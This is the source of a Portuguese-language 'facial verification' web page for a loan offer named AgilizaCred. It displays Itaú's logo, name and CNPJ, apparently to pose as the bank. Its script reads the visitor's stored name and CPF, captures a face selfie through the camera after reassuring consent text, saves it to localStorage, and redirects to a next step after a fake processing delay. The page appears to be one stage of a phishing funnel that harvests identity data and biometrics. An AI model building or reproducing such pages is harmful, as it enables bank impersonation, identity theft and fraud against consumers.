<!DOCTYPE html><html lang="pt-BR"><head>
  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
  <script>
    window.pixelId = "69853718bc934f7cb27cf6c5";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(a);
  </script>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Verificação Facial — AgilizaCred</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700&family=Sora:wght@700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --green-accent: #ff6200;
      --green-accent-dark: #ff6200;
      --green-accent-light: #fff0e4;
      --green-primary: #ff6200;
      --green-dark: #1F2937;
      --green-darker: #374151;
      --bg: #F4F5F7;
      --card: #fff;
      --muted: #6b7280;
      --success: #22C55E;
      --danger: #ef4444;
      --radius: 14px;
      font-family: 'DM Sans', sans-serif;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--bg);
      color: #111827;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding-top: 72px;
    }

    header.header {
      background: #FFFFFF;
      padding: 14px 0;
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 1000;
      box-shadow: 0 1px 0 #E5E7EB;
    }

    .header-content {
      padding: 0 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      max-width: 420px;
      margin: 0 auto;
    }

    .header-left { display: flex; align-items: center; gap: 14px; }

    .menu-icon {
      width: 40px;
      height: 40px;
      background: #F3F4F6;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.2s ease;
      border: 1px solid #E5E7EB;
    }

    .menu-icon:hover { background: #E5E7EB; transform: scale(1.05); }

    .menu-icon svg { width: 18px; height: 18px; color: #374151; stroke-width: 2.5; }

    .logo-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      user-select: none;
      text-decoration: none;
    }

    .logo-row { display: flex; align-items: center; }

    .logo-cred {
      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
      font-weight: 800;
      font-size: 20px;
      color: #111827;
      letter-spacing: -0.5px;
      line-height: 1;
    }

    .logo-diamond {
      width: 7px;
      height: 7px;
      background: #22C55E;
      transform: rotate(45deg);
      margin: 0 8px;
      border-radius: 1.5px;
      flex-shrink: 0;
    }

    .logo-on {
      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
      font-weight: 800;
      font-size: 20px;
      color: #22C55E;
      letter-spacing: -0.5px;
      line-height: 1;
    }

    .logo-tagline {
      font-family: 'DM Sans', 'Poppins', sans-serif;
      font-weight: 600;
      font-size: 7px;
      letter-spacing: 2.5px;
      text-transform: uppercase;
      color: #6B7280;
      margin-top: 1px;
    }

    /* ✅ NOVO: logo como imagem (header/rodapé) */
    .brand-logo{
      display:flex;
      align-items:center;
      user-select:none;
      text-decoration:none;
      line-height:0;
    }
    .brand-logo img{
      display:block;
      height: 47px; /* ajuste se quiser */
      width:auto;
      max-width: 190px;
      object-fit: contain;
    }
    .footer-logo-img img{
      height: 20px; /* ajuste se quiser */
      max-width: 180px;
      opacity: 0.95;
    }

    .user-info { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
    .user-name { font-size: 13px; font-weight: 600; color: #111827; max-width: 120px; }
    .user-cpf { font-size: 11px; color: #6B7280; letter-spacing: 0.3px; }

    .user-icon-wrapper {
      width: 40px;
      height: 40px;
      background: #DCFCE7;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      border: 2px solid var(--green-accent);
      color: #16A34A;
    }

    .user-icon-wrapper svg { width: 20px; height: 20px; color: #16A34A; }

    .header-right { display: flex; align-items: center; gap: 10px; }

    .wrap {
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      padding: 20px;
      flex: 1;
    }

    .card {
      background: var(--card);
      border-radius: var(--radius);
      box-shadow: 0 8px 28px rgba(26, 58, 58, 0.1);
      padding: 20px;
      border: 1px solid rgba(26, 58, 58, 0.08);
    }

    h1 {
      font-size: 1.25rem;
      margin: 0 0 8px;
      color: #111827;
      font-family: 'Outfit', sans-serif;
      font-weight: 700;
      letter-spacing: -0.3px;
    }

    p.lead {
      margin: 0 0 14px;
      color: var(--muted);
      font-size: 0.95rem
    }

    .consent-list { display: grid; gap: 8px; margin: 12px 0 0 }

    .consent-item {
      display: flex;
      gap: 10px;
      align-items: flex-start;
      background: #FAFBFC;
      border: 1.5px solid #E5E7EB;
      padding: 10px;
      border-radius: 10px
    }

    .consent-item svg { flex: 0 0 28px; color: var(--green-accent) }
    .consent-item strong { color: #111827; }
    .consent-item .small { color: #6B7280; }

    .btn-row { display: flex; gap: 10px; margin-top: 16px }

    .btn {
      flex: 1;
      padding: 12px 14px;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      font-family: 'DM Sans', sans-serif;
      transition: all 0.2s ease;
    }

    .btn.primary {
      background: var(--green-accent);
      color: #fff;
      box-shadow: 0 4px 12px rgba(34, 197, 94, .25);
    }

    .btn.primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 16px rgba(34, 197, 94, .35);
      background: var(--green-accent-dark);
    }

    .btn.ghost { background: transparent; color: #111827; border: 2px solid #E5E7EB }
    .btn.ghost:hover { background: #F3F4F6; }

    .video-container {
      position: relative;
      width: 100%;
      max-width: 360px;
      margin: 0 auto;
      border-radius: 12px;
      overflow: hidden;
      background: #000;
      transition: all 0.3s ease;
    }

    video { width: 100%; height: auto; display: block; transition: opacity 0.3s ease; }

    .guide {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      pointer-events: none;
    }

    .guide .ring {
      width: 220px;
      height: 260px;
      border-radius: 50%;
      border: 3px solid var(--green-accent);
      box-shadow: 0 8px 20px rgba(34, 197, 94, 0.3);
      display: block;
    }

    .photo-preview { max-width: 360px; margin: 16px auto 0; text-align: center }
    .photo-preview img { width: 100%; border-radius: 12px; transform: scaleX(-1) }

    .small { font-size: 0.88rem; color: var(--muted) }
    .danger { color: var(--danger) }
    .success { color: var(--success) }
    .hidden { display: none !important }

    .capture-success {
      background: var(--green-accent-light);
      border: 2px solid var(--green-accent);
      color: #111827;
      padding: 12px;
      border-radius: 10px;
      text-align: center;
      font-weight: 600;
      margin: 12px 0;
      animation: fadeInScale 0.4s ease-out;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .capture-success svg { width: 20px; height: 20px; color: var(--green-accent); }

    @keyframes fadeInScale {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 2000;
      align-items: center;
      justify-content: center;
    }
    .loading-overlay.active { display: flex; }

    .loading-content {
      background: white;
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      max-width: 300px;
    }

    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid var(--green-accent-light);
      border-top: 4px solid var(--green-accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .loading-text { font-size: 16px; font-weight: 600; color: #111827; }

    footer.site-footer {
      margin-top: auto;
      background: #FFFFFF;
      color: #6B7280;
      padding: 24px 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-top: 1px solid #E5E7EB;
    }

    .footer-inner {
      max-width: 420px;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    .footer-logo { display: flex; align-items: center; user-select: none; }

    .footer-logo .fl-cred {
      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
      font-weight: 800;
      font-size: 15px;
      color: #6B7280;
      letter-spacing: -0.5px;
    }
    .footer-logo .fl-diamond {
      width: 5px;
      height: 5px;
      background: #6B7280;
      transform: rotate(45deg);
      margin: 0 6px;
      border-radius: 1px;
      display: inline-block;
      vertical-align: middle;
    }
    .footer-logo .fl-on {
      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
      font-weight: 800;
      font-size: 15px;
      color: #22C55E;
      letter-spacing: -0.5px;
    }

    footer small { font-size: 11px; opacity: 0.75; line-height: 1.5; text-align: center; }
    footer small strong { color: #16A34A; font-weight: 600; }

    @media (max-width:420px) {
      .guide .ring { width: 180px; height: 210px }
      .card { margin: 10px; padding: 16px; }
      .wrap { padding: 16px; }
    }
  </style>
</head>

<body>
  <header class="header">
    <div class="header-content">
      <div class="header-left">
        <div class="menu-icon">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
          </svg>
        </div>

        <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
        <a class="brand-logo" href="#" aria-label="Itaú / AgilizaCred">
          <img src="/images/itau2.png" alt="Itaú">
        </a>

        <!-- (se quiser manter a logo antiga também, descomente) -->
        <!--
        <div class="logo-wrap">
          <div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
          <span class="logo-tagline">Crédito Fácil</span>
        </div>
        -->
      </div>
      <div class="header-right">
        <div class="user-info">
          <span class="user-name" id="userName">Usuário</span>
          <span class="user-cpf" id="userCpf">***.***.***-**</span>
        </div>
        <div class="user-icon-wrapper">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
          </svg>
        </div>
      </div>
    </div>
  </header>

  <div class="wrap">
    <div class="card" id="stepConsent">
      <h1>Verificação facial</h1>
      <p class="lead">Para sua segurança, precisamos validar sua identidade com uma foto sua. O processo é rápido e
        seguro.</p>
      <div class="consent-list">
        <div class="consent-item">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          </svg>
          <div>
            <strong>Uso limitado:</strong>
            <div class="small">A foto será usada apenas para validação de identidade no processo de contratação.</div>
          </div>
        </div>
        <div class="consent-item">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
          <div>
            <strong>Proteção de dados</strong>
            <div class="small">Seus dados e imagem não serão compartilhados com terceiros sem autorização.</div>
          </div>
        </div>
        <div class="consent-item">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="12" cy="12" r="10"></circle>
            <polyline points="12 6 12 12 16 14"></polyline>
          </svg>
          <div>
            <strong>Rápido e simples</strong>
            <div class="small">Leva menos de 1 minuto — confirme e tire a foto.</div>
          </div>
        </div>
      </div>
      <div style="margin-top:14px" class="small">Ao confirmar você autoriza a captura e o uso para validação desta
        operação.</div>
      <div class="btn-row">
        <button class="btn ghost" id="btnCancel">Cancelar</button>
        <button class="btn primary" id="btnAgree">Concordo e prosseguir</button>
      </div>
    </div>

    <div class="card hidden" id="stepCamera">
      <h1>Capturar foto</h1>
      <p class="small">Posicione seu rosto dentro do círculo e toque em Capturar.</p>
      <div class="video-container" id="videoWrap">
        <video id="video" autoplay="" playsinline="" muted=""></video>
        <div class="guide"><span class="ring" aria-hidden="true"></span></div>
      </div>
      <div style="display:flex; gap:10px; justify-content:center; margin-top:12px;" id="cameraControls">
        <button class="btn ghost" id="btnRetryCam">Reiniciar câmera</button>
        <button class="btn primary" id="btnCapture">Capturar imagem</button>
      </div>
      <div id="captureSuccess" class="capture-success hidden">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
        </svg>
        Foto capturada com sucesso! Analise a imagem abaixo.
      </div>
      <div id="previewArea" class="photo-preview hidden">
        <img id="photoImg" alt="Foto capturada">
        <div style="display:flex; gap:10px; justify-content:center; margin-top:12px;">
          <button class="btn primary" id="btnUse">Usar esta foto</button>
          <button class="btn ghost" id="btnRetake">Tentar novamente</button>
        </div>
        <div style="margin-top:8px" class="small">Ao prosseguir você será redirecionado.</div>
      </div>
      <div id="cameraError" class="small danger hidden" style="margin-top:12px;"></div>
    </div>
  </div>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-content">
      <div class="loading-spinner"></div>
      <div class="loading-text">Processando...</div>
    </div>
  </div>

  <footer class="site-footer">
    <div class="footer-inner">

      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
      <a class="brand-logo footer-logo-img" href="#" aria-label="Itaú / AgilizaCred">
        <img src="/images/itau2.png" alt="Itaú">
      </a>

      <small><strong>Itaú Unibanco S.A</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP –
        01310-200</small>
    </div>
  </footer>

  <script>
    function loadUserData() {
      const nome = localStorage.getItem('nome');
      if (nome) {
        const nomes = nome.trim().split(' ');
        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
        document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
      }
      const cpf = localStorage.getItem('cpf');
      if (cpf) {
        const cpfLimpo = cpf.replace(/\D/g, '');
        if (cpfLimpo.length === 11) {
          document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
        }
      }
    }
    document.addEventListener('DOMContentLoaded', loadUserData);

    const btnAgree = document.getElementById('btnAgree');
    const btnCancel = document.getElementById('btnCancel');
    const stepConsent = document.getElementById('stepConsent');
    const stepCamera = document.getElementById('stepCamera');
    const video = document.getElementById('video');
    const btnCapture = document.getElementById('btnCapture');
    const previewArea = document.getElementById('previewArea');
    const photoImg = document.getElementById('photoImg');
    const btnUse = document.getElementById('btnUse');
    const btnRetake = document.getElementById('btnRetake');
    const btnRetryCam = document.getElementById('btnRetryCam');
    const cameraError = document.getElementById('cameraError');
    const captureSuccess = document.getElementById('captureSuccess');
    const cameraControls = document.getElementById('cameraControls');
    const loadingOverlay = document.getElementById('loadingOverlay');

    let stream = null;
    let capturedDataUrl = null;

    function showStepCamera() {
      stepConsent.classList.add('hidden');
      stepCamera.classList.remove('hidden');
      startCamera();
    }

    btnAgree.addEventListener('click', () => showStepCamera());
    btnCancel.addEventListener('click', () => { history.back(); });

    async function startCamera() {
      cameraError.classList.add('hidden');
      const constraints = { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false };
      try {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        await video.play();
      } catch (err) {
        console.error('camera error', err);
        cameraError.textContent = 'Não foi possível acessar a câmera. Verifique permissões e tente novamente.';
        cameraError.classList.remove('hidden');
      }
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      video.pause();
      video.srcObject = null;
    }

    btnCapture.addEventListener('click', () => {
      if (!stream) {
        cameraError.textContent = 'Câmera não iniciada.';
        cameraError.classList.remove('hidden');
        return;
      }
      const w = video.videoWidth;
      const h = video.videoHeight;
      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.translate(w, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, w, h);
      capturedDataUrl = canvas.toDataURL('image/jpeg', 0.92);

      cameraControls.style.opacity = '0';
      setTimeout(() => {
        cameraControls.classList.add('hidden');
        captureSuccess.classList.remove('hidden');
        photoImg.src = capturedDataUrl;
        previewArea.classList.remove('hidden');
        video.style.opacity = '0.1';
      }, 300);
    });

    btnRetake.addEventListener('click', () => {
      capturedDataUrl = null;
      photoImg.src = '';
      previewArea.classList.add('hidden');
      captureSuccess.classList.add('hidden');
      cameraControls.classList.remove('hidden');
      cameraControls.style.opacity = '1';
      video.style.opacity = '1';
    });

    btnRetryCam.addEventListener('click', async () => {
      stopCamera();
      await startCamera();
      cameraError.classList.add('hidden');
      previewArea.classList.add('hidden');
      captureSuccess.classList.add('hidden');
      cameraControls.classList.remove('hidden');
      cameraControls.style.opacity = '1';
      video.style.opacity = '1';
    });

    btnUse.addEventListener('click', async () => {
      if (!capturedDataUrl) {
        alert('Faça a captura antes de prosseguir.');
        return;
      }

      try { localStorage.setItem('nbk_captured_photo', capturedDataUrl); }
      catch (e) { console.warn('Erro ao salvar no localStorage', e); }

      btnUse.disabled = true;
      btnUse.innerHTML = '<svg style="width:16px;height:16px;margin-right:6px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Confirmando...';

      loadingOverlay.classList.add('active');

      setTimeout(() => {
        loadingOverlay.classList.remove('active');

        const confirmMsg = document.createElement('div');
        confirmMsg.innerHTML = '<svg style="width:24px;height:24px;margin-right:8px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Foto confirmada! Redirecionando...';
        confirmMsg.style.cssText = `position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--green-accent); color: white; padding: 20px 30px; border-radius: 12px; font-weight: 600; z-index: 2000; text-align: center; display: flex; align-items: center; box-shadow: 0 8px 30px rgba(34,197,94,.4);`;
        document.body.appendChild(confirmMsg);

        setTimeout(() => {
          const p = new URLSearchParams(window.location.search);
          window.location.href = '7.html' + (p.toString() ? '?' + p : '');
        }, 1200);
      }, 800);
    });

    window.addEventListener('pagehide', () => stopCamera());
    window.addEventListener('beforeunload', () => stopCamera());
  </script>

</body></html>
